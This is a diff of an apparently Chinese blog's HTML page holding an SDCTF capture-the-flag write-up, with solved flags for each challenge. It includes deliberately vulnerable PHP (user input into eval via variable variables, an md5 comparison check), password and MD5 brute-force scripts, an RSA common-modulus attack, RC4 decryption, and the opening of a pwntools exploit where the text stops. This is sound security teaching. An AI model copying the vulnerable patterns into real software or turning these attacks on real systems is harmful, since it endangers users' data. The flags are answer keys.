@@ -253,7 +253,7 @@ SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&
 
     
         <meta property="article:published_time" content="Sat Apr 08 2017 13:31:48 GMT+0800">
-        <meta property="article:modified_time" content="Sun Jun 04 2017 13:47:28 GMT+0800">
+        <meta property="article:modified_time" content="Fri Dec 08 2017 16:33:28 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -276,7 +276,7 @@ SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&
     "mainEntityOfPage": "http://righte0us.cc/2017/04/08/SDCTF/index.html",
     "headline": "SDCTF",
     "datePublished": "Sat Apr 08 2017 13:31:48 GMT+0800",
-    "dateModified": "Sun Jun 04 2017 13:47:28 GMT+0800",
+    "dateModified": "Fri Dec 08 2017 16:33:28 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "Righteous",
@@ -523,23 +523,23 @@ SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&
 <p>Flag:SDCTF{244fcba2093a5c942ee11f0f3f28f21f}</p>
 <h2 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h2><p> 发现.git,访问发现aaa.php</p>
 <p><img src="/images/sdctf/2.png" alt=""></p>
-<pre><code>if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) { 
-   if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;]) 
-      if (md5($_GET[&apos;a&apos;]) === md5($_GET[&apos;b&apos;])) 
-         die(&apos;Flag: &apos;.$flag); 
+<pre><code>if (isset($_GET[&#39;a&#39;]) and isset($_GET[&#39;b&#39;])) { 
+   if ($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;]) 
+      if (md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) 
+         die(&#39;Flag: &#39;.$flag); 
       else 
-         print &apos;Wrong.&apos;; }
+         print &#39;Wrong.&#39;; }
 </code></pre><p><img src="/images/sdctf/3.png" alt=""><br>Flag: SDCTF{44224d27bfe875886f4b7247e16e48f8}</p>
 <h2 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h2><p>打开题目我们直接就看到源码，加上注释如下</p>
 <pre><code>&lt;?php
-$SDPC = @$_REQUEST[&apos;hello&apos;];     //$SDPC这个变量请求变量hello的值
-if(!preg_match(&apos;/^\w*$/&apos;,$SDPC )){ //正则表达式，匹配字符串，\w表示字符+数字+下划线，*代表有若干个\w字符  组成。
-die(&apos;ERROR&apos;);//不匹配则输出ERROR
+$SDPC = @$_REQUEST[&#39;hello&#39;];     //$SDPC这个变量请求变量hello的值
+if(!preg_match(&#39;/^\w*$/&#39;,$SDPC )){ //正则表达式，匹配字符串，\w表示字符+数字+下划线，*代表有若干个\w字符  组成。
+die(&#39;ERROR&#39;);//不匹配则输出ERROR
 }
 eval(&quot;var_dump($$SDPC);&quot;);       //如果匹配输出\$\$SDPC的值
 </code></pre><p>而且通过题目链接可以知道hello变量一定是6位的，一开始真以为是爆破了，但是一想肯定很大，不可能。而且我们发现 $$a 这个东西很诡异。其实就是PHP中变量可以当作另一个变量的变量名。例如</p>
 <pre><code>&lt;?php
- $a=&apos;b&apos;;
+ $a=&#39;b&#39;;
  $b=&quot;hello world!&quot;;
  eval(&quot;var_dump($$a);&quot;);
 ?&gt;
@@ -556,13 +556,43 @@ eval(&quot;var_dump($$SDPC);&quot;);       //如果匹配输出\$\$SDPC的值
 <p><img src="/images/sdctf/9.png" alt=""></p>
 <p>Flag:SDCTF{25861b2471456810bea272fd666a8b79}</p>
 <h2 id="Misc500-MP3stego"><a href="#Misc500-MP3stego" class="headerlink" title="Misc500(MP3stego)"></a>Misc500(MP3stego)</h2><p>根据RGB生成二维码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">280</span></span><br><span class="line">y = <span class="number">280</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"QR.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line">rgbinfo = f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">c = Image.new(<span class="string">"RGB"</span>,(x,y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">      rgb = rgbinfo[i * y + j].split(<span class="string">","</span>)</span><br><span class="line">      c.putpixel([i, j],(int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))</span><br><span class="line">c.show()</span><br></pre></td></tr></table></figure>
-<p>得到：MP3stego的密码在1000-1300之间。</p>
+<pre><code>from PIL import Image
+
+x = 280
+y = 280
+
+f = open(&quot;QR.txt&quot;,&#39;r&#39;)
+rgbinfo = f.readlines()
+f.close()
+c = Image.new(&quot;RGB&quot;,(x,y))
+
+for i in range(0,x):
+   for j in range(0,y):
+      rgb = rgbinfo[i * y + j].split(&quot;,&quot;)
+      c.putpixel([i, j],(int(rgb[0]), int(rgb[1]),int(rgb[2])))
+c.show()
+</code></pre><p>得到：MP3stego的密码在1000-1300之间。</p>
 <p>生成字典</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f =open(&apos;pwd.txt&apos;,&apos;a&apos;)</span><br><span class="line">line = &apos;&apos;</span><br><span class="line">for i in xrange(1000,1300):</span><br><span class="line">  f.write(line+str(i)+&apos;\n&apos;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-<p>循环爆破</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> open(<span class="string">'pwd.txt'</span>):</span><br><span class="line">   command=<span class="string">'decode -X -P %s mp3.mp3'</span> % a.strip()</span><br><span class="line">   <span class="keyword">print</span> command</span><br><span class="line">   p=subprocess.Popen(command,stdin=subprocess.PIPE,</span><br><span class="line">   stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=<span class="keyword">True</span>)</span><br><span class="line">   <span class="keyword">if</span> <span class="string">"unexpected end of cipher message."</span><span class="keyword">not</span> <span class="keyword">in</span> p.communicate()[<span class="number">1</span>]:</span><br><span class="line">	  <span class="keyword">print</span> <span class="string">'[&gt;]password is find:%s'</span> %a.strip()</span><br><span class="line">	  <span class="keyword">print</span> command</span><br><span class="line">	  flag = open(<span class="string">'mp3.mp3.txt'</span>)</span><br><span class="line">	  <span class="keyword">print</span> flag.read()</span><br><span class="line">	  <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/sdctf/10.png" alt=""><br>Flag:flag{Brute_f0Rce_iS_W0nderful}</p>
+<pre><code>f =open(&#39;pwd.txt&#39;,&#39;a&#39;)
+line = &#39;&#39;
+for i in xrange(1000,1300):
+  f.write(line+str(i)+&#39;\n&#39;)
+f.close()
+</code></pre><p>循环爆破</p>
+<pre><code>import os
+import subprocess
+for a in open(&#39;pwd.txt&#39;):
+   command=&#39;decode -X -P %s mp3.mp3&#39; % a.strip()
+   print command
+   p=subprocess.Popen(command,stdin=subprocess.PIPE,
+   stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
+   if &quot;unexpected end of cipher message.&quot;not in p.communicate()[1]:
+      print &#39;[&gt;]password is find:%s&#39; %a.strip()
+      print command
+      flag = open(&#39;mp3.mp3.txt&#39;)
+      print flag.read()
+      break
+</code></pre><p><img src="/images/sdctf/10.png" alt=""><br>Flag:flag{Brute_f0Rce_iS_W0nderful}</p>
 <h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto200-Knock"><a href="#Crypto200-Knock" class="headerlink" title="Crypto200(Knock)"></a>Crypto200(Knock)</h2><p>text文件中数字替换为英文字母得：zjqzhexjzmooqrssaidaiynlebnzjovosltahzjerhorrqxoeironlobdozavoouzjovosqfqsltahmqnqrrjotoerzjohorrqxoebooqydrztyqqojolx</p>
 <p>与knock文件中…._…替换：<br>zjqz_hexjz_mo_oqrs_sai_daiyn_lebn_zjo_vos_ltah_zjer_horrqxo_e_iron_lobdo_za_voou_zjo_vos_qfqs_ltah_mqn_qrr_joto_er_zjo_horrqxo_ebooqydrztyqqojolx</p>
 <p>在线解密（<a href="http://quipqiup.com/）" target="_blank" rel="noopener">http://quipqiup.com/）</a><br><img src="/images/sdctf/11.png" alt=""></p>
@@ -571,19 +601,170 @@ eval(&quot;var_dump($$SDPC);&quot;);       //如果匹配输出\$\$SDPC的值
 <h2 id="Crypto300-MD5"><a href="#Crypto300-MD5" class="headerlink" title="Crypto300(MD5)"></a>Crypto300(MD5)</h2><p>发现第51个文件大小异常，提取，hex中补全PNG文件头，得到：</p>
 <p><img src="/images/sdctf/12.png" alt=""></p>
 <p>MD5爆破即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">x = range(<span class="number">97</span>,<span class="number">122</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> x:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> x:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> x:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> x:</span><br><span class="line">                 <span class="keyword">for</span> e <span class="keyword">in</span> x:</span><br><span class="line">                	 m = hashlib.md5()</span><br><span class="line">                	 flag = <span class="string">"SDCTF&#123;a95"</span>+chr(a)+<span class="string">"0b39186"</span>+chr(b)+<span class="string">"887"</span>+chr(c)+<span class="string">"949f87"</span>+chr(d)+<span class="string">"20b44b"</span>+chr(e)+<span class="string">"b5"</span>+<span class="string">"&#125;"</span></span><br><span class="line">                         m.update(flag)</span><br><span class="line">                         n= m.hexdigest()</span><br><span class="line">                         n0 = list(n)</span><br><span class="line">                         <span class="keyword">if</span> n0[<span class="number">0</span>]==<span class="string">'9'</span>:</span><br><span class="line">                           <span class="keyword">if</span> n0[<span class="number">1</span>]==<span class="string">'5'</span>:</span><br><span class="line">                        	 <span class="keyword">if</span> n0[<span class="number">2</span>]==<span class="string">'d'</span>:</span><br><span class="line">                        	   <span class="keyword">if</span> n0[<span class="number">3</span>]==<span class="string">'c'</span>:</span><br><span class="line">                        	     <span class="keyword">if</span> n0[<span class="number">7</span>]==<span class="string">'8'</span>:</span><br><span class="line">                        	       <span class="keyword">if</span> n0[<span class="number">30</span>]==<span class="string">'a'</span>:</span><br><span class="line">                        	 	     <span class="keyword">if</span> n0[<span class="number">31</span>]==<span class="string">'3'</span>:</span><br><span class="line">                        	 	       <span class="keyword">print</span> n0</span><br><span class="line">                        	 	       <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
-<p>Flag:SDCTF{a95a0b39186f887b949f87f20b44bdb5}</p>
+<pre><code>import hashlib
+
+x = range(97,122)
+for a in x:
+    for b in x:
+        for c in x:
+            for d in x:
+                 for e in x:
+                     m = hashlib.md5()
+                     flag = &quot;SDCTF{a95&quot;+chr(a)+&quot;0b39186&quot;+chr(b)+&quot;887&quot;+chr(c)+&quot;949f87&quot;+chr(d)+&quot;20b44b&quot;+chr(e)+&quot;b5&quot;+&quot;}&quot;
+                         m.update(flag)
+                         n= m.hexdigest()
+                         n0 = list(n)
+                         if n0[0]==&#39;9&#39;:
+                           if n0[1]==&#39;5&#39;:
+                             if n0[2]==&#39;d&#39;:
+                               if n0[3]==&#39;c&#39;:
+                                 if n0[7]==&#39;8&#39;:
+                                   if n0[30]==&#39;a&#39;:
+                                      if n0[31]==&#39;3&#39;:
+                                        print n0
+                                        print flag
+</code></pre><p>Flag:SDCTF{a95a0b39186f887b949f87f20b44bdb5}</p>
 <h2 id="Crypto500-RSA"><a href="#Crypto500-RSA" class="headerlink" title="Crypto500(RSA)"></a>Crypto500(RSA)</h2><p>分析加密脚本，使用了相同的N,不同的e,加密相同的数据,且两个加密指数互素，可以通过共模攻击在两个密文和公钥被嗅探的情况下还原出明文m的值</p>
 <p>两个加密指数互质(e1,e2)=1,即存在s1,s2使得s1e1+s2e2=1<br>c1 ≡ me1 mod n<br>c2 ≡ me2 mod n<br>即 c1s1 c2s2 ≡ m mod n</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n=<span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">fo1 = open(<span class="string">'flag.enc1'</span>, <span class="string">'rb'</span>)</span><br><span class="line">fo2 = open(<span class="string">'flag.enc2'</span>, <span class="string">'rb'</span>)</span><br><span class="line">datafo1 = fo1.read()</span><br><span class="line">c1 = s2n(datafo1)</span><br><span class="line">fo1.close()</span><br><span class="line">datafo2 = fo2.read()</span><br><span class="line">c2 = s2n(datafo2)</span><br><span class="line">fo2.close()</span><br><span class="line">c2 = invert(c2,n)</span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">s = egcd(e1,e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line">s2 = - s2</span><br><span class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line"><span class="keyword">print</span> n2s(m)</span><br></pre></td></tr></table></figure>
-<p>flag.txt:<br>“You were not born a winner, and you were not born a loser. You are what you make yourself be.”SDCTF{ef31070d66440687a73beb6242f298bc}</p>
+<pre><code>from libnum import n2s,s2n
+from gmpy2 import invert
+n=0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L
+def egcd(a, b):
+  if a == 0:
+    return (b, 0, 1)
+  else:
+    g, y, x = egcd(b % a, a)
+    return (g, x - (b // a) * y, y)
+fo1 = open(&#39;flag.enc1&#39;, &#39;rb&#39;)
+fo2 = open(&#39;flag.enc2&#39;, &#39;rb&#39;)
+datafo1 = fo1.read()
+c1 = s2n(datafo1)
+fo1.close()
+datafo2 = fo2.read()
+c2 = s2n(datafo2)
+fo2.close()
+c2 = invert(c2,n)
+e1 = 17
+e2 = 65537
+s = egcd(e1,e2)
+s1 = s[1]
+s2 = s[2]
+s2 = - s2
+m = pow(c1, s1, n) * pow(c2, s2, n) % n
+print n2s(m)
+</code></pre><p>flag.txt:<br>“You were not born a winner, and you were not born a loser. You are what you make yourself be.”SDCTF{ef31070d66440687a73beb6242f298bc}</p>
 <h1 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h1><h2 id="Bin300-RC4"><a href="#Bin300-RC4" class="headerlink" title="Bin300(RC4)"></a>Bin300(RC4)</h2><p>RC4算法,逆向得到key和data<br>key= “I_am_the_flag”;<br>data={19,118,31,-9,43,-100,54,-56,-85,-91,-65,-51,-71,86,-27,-75,79,3,19,89,-46,58,10,68,121,85,-8,-36,-116,75,107,-68,124,81,-101,-112,-73,-80,37}</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = <span class="string">"I_am_the_flag"</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">512</span>]= &#123;<span class="number">19</span>,<span class="number">118</span>,<span class="number">31</span>,<span class="number">-9</span>,<span class="number">43</span>,<span class="number">-100</span>,<span class="number">54</span>,<span class="number">-56</span>,<span class="number">-85</span>,<span class="number">-91</span>,<span class="number">-65</span>,<span class="number">-51</span>,<span class="number">-71</span>,<span class="number">86</span>,<span class="number">-27</span>,<span class="number">-75</span>,<span class="number">79</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">89</span>,<span class="number">-46</span>,<span class="number">58</span>,<span class="number">10</span>,<span class="number">68</span>,<span class="number">121</span>,<span class="number">85</span>,<span class="number">-8</span>,<span class="number">-36</span>,<span class="number">-116</span>,<span class="number">75</span>,<span class="number">107</span>,<span class="number">-68</span>,<span class="number">124</span>,<span class="number">81</span>,<span class="number">-101</span>,<span class="number">-112</span>,<span class="number">-73</span>,<span class="number">-80</span>,<span class="number">37</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(flag); </span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)flag, len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>或py解密</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random, base64,binascii</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line">data = <span class="string">"数据"</span></span><br><span class="line">key = <span class="string">'密钥'</span></span><br><span class="line">decoded_data = crypt(data,key)</span><br><span class="line"><span class="keyword">print</span> decoded_data</span><br></pre></td></tr></table></figure>
-<p>Flag:SDCTF{912128f324fd3ea3f5d9cb517b4d9001}</p>
-<h2 id="Bin500-PwnPwnPwn"><a href="#Bin500-PwnPwnPwn" class="headerlink" title="Bin500(PwnPwnPwn)"></a>Bin500(PwnPwnPwn)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">elf = 